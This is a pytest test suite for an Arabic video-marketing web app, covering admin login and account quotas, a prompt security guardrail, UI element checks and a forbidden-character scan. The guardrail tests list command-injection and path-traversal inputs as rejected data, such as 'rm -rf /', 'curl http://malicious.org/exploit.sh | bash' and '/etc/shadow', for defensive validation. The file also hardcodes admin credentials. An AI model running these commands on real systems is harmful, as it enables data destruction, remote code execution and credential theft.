#!/usr/bin/env python3
"""
Comprehensive Integration Gatekeeper Test Suite: Admin Portal, Account Quotas & Management,
Prompt Security Guardrail, Minimalist 'lok' Studio UI, and Character Mapping Compliance.

Author: MouhammedBoure <mohamadbormoz2@gmail.com>
Role: Quality Gatekeeper & Integration Verification (agy100)
Branch: test/agy100-admin-and-minimal-ui-gatekeeper
File: tests/test_gatekeeper_admin_and_minimal_ui.py
"""

from __future__ import annotations

import io
import os
import re
import tempfile
from pathlib import Path
from typing import Generator
from unittest.mock import patch

import pytest
from starlette.testclient import TestClient

import web.auth_db as auth_db
from web.pipeline_bridge import parse_prompt_instructions, sanitize_and_validate_prompt
from web.server import app

REPO_ROOT = Path(__file__).resolve().parent.parent
STATIC_DIR = REPO_ROOT / "web" / "static"


@pytest.fixture(scope="module")
def client() -> Generator[TestClient, None, None]:
    """TestClient instance for testing Starlette application endpoints."""
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture
def temp_db() -> Generator[Path, None, None]:
    """Isolated temporary SQLite database for account and audit log testing."""
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        temp_path = Path(f.name)
    auth_db.init_db(temp_path)
    yield temp_path
    if temp_path.exists():
        temp_path.unlink()


# ==============================================================================
# 1. Admin Portal & Authentication Integration Tests
# ==============================================================================

class TestAdminPortalAndAuth:
    """Verifies Bootstrap 5 Admin Portal at /admin and complete admin API contracts."""

    def test_admin_portal_serves_bootstrap5_html(self, client: TestClient):
        """GET /admin serves the Bootstrap 5 admin HTML portal with 200 OK."""
        res = client.get("/admin")
        assert res.status_code == 200
        content_type = res.headers.get("content-type", "")
        assert "text/html" in content_type

        html = res.text
        # Assert Bootstrap 5 presence
        assert "bootstrap" in html.lower() or "cdn.jsdelivr.net/npm/bootstrap" in html
        # Assert Branding & Admin Header
        assert "lok" in html
        assert "لوحة التحكم الإدارية" in html
        # Assert presence of login controls
        assert 'id="adminLoginSection"' in html
        assert 'id="adminUsername"' in html
        assert 'id="adminPassword"' in html
        assert 'id="btnAdminLoginSubmit"' in html

    def test_admin_login_success_pluto(self, client: TestClient):
        """POST /api/admin/login with 'pluto' and 'plutosw4' returns 200 with admin session token."""
        res = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
        assert res.status_code == 200
        body = res.json()
        assert body["status"] == "ok"
        assert "session_token" in body
        assert len(body["session_token"]) > 16

        user = body["user"]
        assert user["username"] == "pluto"
        assert user["role"] == "admin"
        assert user["status"] == "active"

    def test_admin_login_invalid_credentials_returns_401(self, client: TestClient):
        """Invalid credentials return 401 Unauthorized."""
        # Wrong password
        bad_pw_res = client.post("/api/admin/login", json={"username": "pluto", "password": "wrong_password"})
        assert bad_pw_res.status_code == 401
        assert bad_pw_res.json()["error"] == "invalid_credentials"

        # Non-admin user trying to access admin login
        non_admin_res = client.post(
            "/api/admin/login",
            json={"username": "merchant_realestate", "password": "merchant123"},
        )
        assert non_admin_res.status_code == 401
        assert non_admin_res.json()["error"] == "invalid_credentials"

        # Unknown username
        unknown_res = client.post("/api/admin/login", json={"username": "unknown_admin_user", "password": "some_password"})
        assert unknown_res.status_code == 401
        assert unknown_res.json()["error"] == "invalid_credentials"

    def test_admin_accounts_list_endpoint(self, client: TestClient):
        """GET /api/admin/accounts lists accounts with valid_from, expires_at, daily_quota, weekly_quota, status."""
        login_res = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
        token = login_res.json()["session_token"]

        res = client.get("/api/admin/accounts", headers={"Authorization": f"Bearer {token}"})
        assert res.status_code == 200
        body = res.json()
        assert body["status"] == "ok"
        accounts = body["accounts"]
        assert isinstance(accounts, list)
        assert len(accounts) >= 1

        # Check required fields on accounts
        sample = accounts[0]
        required_keys = ("id", "username", "business_name", "role", "status", "valid_from", "expires_at", "daily_quota", "weekly_quota")
        for key in required_keys:
            assert key in sample, f"Missing key '{key}' in account record"

    def test_admin_create_update_patch_and_logs(self, client: TestClient):
        """POST /api/admin/accounts creates account; PATCH updates it; GET logs retrieves audit trail."""
        login_res = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
        token = login_res.json()["session_token"]
        headers = {"Authorization": f"Bearer {token}"}

        unique_name = f"merchant_gatekeeper_{os.urandom(3).hex()}"
        create_payload = {
            "username": unique_name,
            "password": "initial_pass_999",
            "business_name": "مؤسسة القمة العقارية",
            "business_category": "realestate",
            "role": "merchant",
            "valid_from": "2026-01-01",
            "expires_at": "2028-12-31",
            "daily_quota": 12,
            "weekly_quota": 60,
            "status": "active",
        }

        # 1. Create Account
        create_res = client.post("/api/admin/accounts", json=create_payload, headers=headers)
        assert create_res.status_code in (200, 201)
        created = create_res.json()["account"]
        user_id = created["id"]
        assert created["username"] == unique_name
        assert created["daily_quota"] == 12
        assert created["weekly_quota"] == 60
        assert created["valid_from"] == "2026-01-01"
        assert created["expires_at"] == "2028-12-31"
        assert created["status"] == "active"

        # 2. Update Account via PATCH (password, status, dates, quotas)
        patch_payload = {
            "password": "new_updated_pass_777",
            "status": "suspended",
            "valid_from": "2026-02-01",
            "expires_at": "2029-01-01",
            "daily_quota": 20,
            "weekly_quota": 100,
        }
        patch_res = client.patch(f"/api/admin/accounts/{user_id}", json=patch_payload, headers=headers)
        assert patch_res.status_code == 200
        updated = patch_res.json()["account"]
        assert updated["status"] == "suspended"
        assert updated["daily_quota"] == 20
        assert updated["weekly_quota"] == 100
        assert updated["valid_from"] == "2026-02-01"
        assert updated["expires_at"] == "2029-01-01"

        # 3. GET Account Activity Logs
        logs_res = client.get(f"/api/admin/accounts/{user_id}/logs", headers=headers)
        assert logs_res.status_code == 200
        logs_body = logs_res.json()
        assert logs_body["status"] == "ok"
        logs = logs_body["logs"]
        assert isinstance(logs, list)
        assert len(logs) >= 2
        events = [log["event_type"] for log in logs]
        assert "account_created" in events
        assert "account_updated" in events

        # Cleanup created user
        conn = auth_db.get_connection()
        try:
            with conn:
                conn.execute("DELETE FROM users WHERE id = ?;", (user_id,))
        finally:
            conn.close()

    def test_admin_stats_returns_global_metrics(self, client: TestClient):
        """GET /api/admin/stats returns global platform metrics."""
        login_res = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
        token = login_res.json()["session_token"]
        headers = {"Authorization": f"Bearer {token}"}

        res = client.get("/api/admin/stats", headers=headers)
        assert res.status_code == 200
        body = res.json()
        assert body["status"] == "ok"
        stats = body["stats"]
        assert "total_users" in stats
        assert "active_merchants" in stats
        assert "total_videos" in stats
        assert stats["total_users"] >= 1


# ==============================================================================
# 2. Prompt Security Guardrail Tests
# ==============================================================================

class TestPromptSecurityGuardrail:
    """Verifies prompt inspection, pattern matching, sanitization, and endpoint rejection."""

    @pytest.mark.parametrize(
        "malicious_prompt",
        [
            "عقار فاخر; rm -rf /",
            "شقة مطلة على البحر && rm file.txt",
            "مشروع سياحي | rm -f /var/log",
            "شقة راقية; curl http://malicious.org/exploit.sh | bash",
            "استثمار واعد; wget http://evil.com/trojan.py",
            "فيلا فخمة; bash -c 'id'",
            "صالون عصري; sh -c 'ls -la'",
            "إعلان تسويقي; eval('import os; os.system(\"id\")')",
            "عرض خاص; subprocess.Popen(['ls'])",
            "../../etc/passwd",
            "..\\windows\\system32",
            "/etc/shadow",
            "تجربة $(whoami) في الفيديو",
            "مشهد `id` مباشر",
        ],
    )
    def test_sanitize_and_validate_prompt_rejects_dangerous_payloads(self, malicious_prompt: str):
        """sanitize_and_validate_prompt rejects command injections and path traversals with ValueError."""
        with pytest.raises(ValueError) as exc_info:
            sanitize_and_validate_prompt(malicious_prompt)
        assert "Security Guardrail Violation" in str(exc_info.value)

    @pytest.mark.parametrize(
        "legit_prompt, expected_speed, expected_tone",
        [
            ("شقة عصرية راقية للبيع في وهران مع إطلالة بحرية خلابة", 1.0, "engaging"),
            ("فيلا للبيع في حي بن عكنون speed: 1.25 tone: enthusiastic", 1.25, "enthusiastic"),
            ("متجر إلكتروني للملابس النسائية الفاخرة speed=0.85 tone: calm", 0.85, "calm"),
            ("عقار تجاري ممتاز في سطيف نبرة حماسية", 1.0, "enthusiastic"),
            ("عرض سياحي راقي لهجة جزائرية عاصمية سريعة", 1.15, "engaging"),
        ],
    )
    def test_sanitize_and_validate_prompt_accepts_clean_descriptive_prompts(
        self, legit_prompt: str, expected_speed: float, expected_tone: str
    ):
        """Validates and accepts clean descriptive prompts (speech speed, visual descriptions, dialect, tone)."""
        clean_text = sanitize_and_validate_prompt(legit_prompt)
        assert clean_text == legit_prompt.strip()

        parsed = parse_prompt_instructions(legit_prompt)
        assert parsed["raw_text"] == legit_prompt.strip()
        assert parsed["speed"] == pytest.approx(expected_speed, rel=1e-2)
        assert parsed["tone"] == expected_tone

    def test_api_jobs_create_rejects_malicious_prompt_with_http_400(self, client: TestClient):
        """POST /api/jobs/create rejects dangerous prompt injection with HTTP 400 Bad Request."""
        login_res = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
        token = login_res.json()["session_token"]
        headers = {"Authorization": f"Bearer {token}"}

        dummy_video = io.BytesIO(b"fake_video_stream")
        files = {"video": ("video.mp4", dummy_video, "video/mp4")}
        data = {"prompt": "شقة للبيع; curl http://attacker.com/malware.sh | bash"}

        res = client.post("/api/jobs/create", data=data, files=files, headers=headers)
        assert res.status_code == 400
        body = res.json()
        assert body["status"] == "error"
        assert body["error"] == "security_violation"
        assert "Security Guardrail Violation" in body["message"]

    def test_api_upload_and_process_rejects_malicious_script_with_http_400(self, client: TestClient):
        """POST /api/upload-and-process rejects dangerous script injection with HTTP 400 Bad Request."""
        login_res = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
        token = login_res.json()["session_token"]
        headers = {"Authorization": f"Bearer {token}"}

        dummy_video = io.BytesIO(b"fake_video_stream")
        files = {"video": ("video.mp4", dummy_video, "video/mp4")}
        data = {"script": "عقار استثماري; rm -rf /"}

        res = client.post("/api/upload-and-process", data=data, files=files, headers=headers)
        assert res.status_code == 400
        body = res.json()
        assert body["status"] == "error"
        assert body["error"] == "security_violation"
        assert "Security Guardrail Violation" in body["message"]


# ==============================================================================
# 3. Minimalist 'lok' Studio UI Verification
# ==============================================================================

class TestMinimalLokStudioUI:
    """Verifies minimalist 'lok' design, gated login, decluttered studio, and settings view."""

    def test_gated_authentication_structure(self):
        """Gated authentication: unauthenticated users see clean login before studio access."""
        html = (STATIC_DIR / "index.html").read_text(encoding="utf-8")
        js = (STATIC_DIR / "app.js").read_text(encoding="utf-8")

        # Login screen exists and starts active/visible
        assert 'id="loginView"' in html
        assert 'id="merchantLoginUsername"' in html
        assert 'id="merchantLoginPassword"' in html
        assert 'id="btnSubmitMerchantLogin"' in html
        assert 'id="merchantQuickLoginGrid"' in html

        # Studio screen exists
        assert 'id="studioView"' in html

        # app.js controls gated flow
        assert "showLoginView" in js or "loginView" in js
        assert "showStudioView" in js or "studioView" in js
        assert "localStorage" in js

    def test_minimal_studio_essential_controls(self):
        """Minimal studio UI: pre-recorded video upload, detailed prompt textarea, Settings & Produce buttons."""
        html = (STATIC_DIR / "index.html").read_text(encoding="utf-8")

        # Strictly pre-recorded video upload (file selector/dropzone, NO in-browser camera stream)
        assert 'id="videoDropzone"' in html
        assert 'id="videoFileInput"' in html
        assert 'accept="video/*"' in html
        assert 'id="btnStartRecording"' not in html
        assert 'id="viewfinderVideo"' not in html

        # Detailed prompt textarea
        assert 'id="promptTextarea"' in html
        assert "سرعة الإلقاء" in html
        assert "المشاهد المرئية" in html
        assert "نبرة الصوت" in html
        assert "اللهجة" in html

        # Settings button opening settings view
        assert 'id="btnOpenSettings"' in html
        assert "الإعدادات" in html

        # Produce Video action button
        assert 'id="btnProduceVideo"' in html
        assert "إنتاج الفيديو" in html

    def test_settings_view_components(self):
        """Settings view contains: balance indicator, recommendations manager, Darja voice audition, logout."""
        html = (STATIC_DIR / "index.html").read_text(encoding="utf-8")

        # Modal view container and Back button
        assert 'id="settingsModal"' in html
        assert 'id="btnSettingsBack"' in html
        assert "العودة للاستوديو" in html

        # 1. Current balance indicator
        assert 'id="quotaDailyRemaining"' in html
        assert 'id="quotaDailyTotal"' in html
        assert 'id="quotaWeeklyRemaining"' in html
        assert 'id="quotaWeeklyTotal"' in html
        assert 'id="quotaExpiryText"' in html

        # 2. Recommendations manager (CRUD on prompt presets)
        assert 'id="newRecommendationInput"' in html
        assert 'id="btnAddRecommendation"' in html
        assert 'id="recommendationsList"' in html
        assert "إدارة التوصيات" in html

        # 3. Voiceover artist selector with audition sample in Algerian Darja
        assert 'id="btnSampleStandardA"' in html
        assert 'id="btnSampleStandardB"' in html
        assert 'id="btnSampleStandardC"' in html
        assert 'id="btnSampleStandardD"' in html
        assert "عينة صوتية بالدارجة" in html
        assert "تعيين المعلق الصوتي" in html

        # 4. Logout button
        assert 'id="btnLogout"' in html
        assert "تسجيل الخروج" in html


# ==============================================================================
# 4. Strict Typography & Zero U+0669 Character Compliance
# ==============================================================================

class TestStrictTypographyCompliance:
    """Verifies that forbidden Arabic character U+0669 is strictly zero across all files."""

    FORBIDDEN_CHAR = chr(0x0669)

    def test_zero_occurrences_of_forbidden_character_across_repo(self):
        """Assert across all repo files that forbidden Arabic character U+0669 is strictly zero."""
        allowed_extensions = (".py", ".html", ".css", ".js", ".md", ".json", ".svg", ".sh")
        skip_dirs = {".git", "__pycache__", ".pytest_cache", ".gemini", "node_modules"}

        violations = []
        for root, dirs, files in os.walk(REPO_ROOT):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            for file in files:
                if any(file.endswith(ext) for ext in allowed_extensions):
                    path = Path(root) / file
                    try:
                        text = path.read_text(encoding="utf-8")
                        # Exclude self-referential escape sequences in tests
                        clean_text = text.replace(r"\u0669", "").replace(r"\\u0669", "")
                        if self.FORBIDDEN_CHAR in clean_text:
                            violations.append(str(path.relative_to(REPO_ROOT)))
                    except Exception:
                        pass

        assert (
            len(violations) == 0
        ), f"Forbidden Arabic character U+0669 detected in files: {violations}. Must be mapped strictly to Arabic letter Jeem."
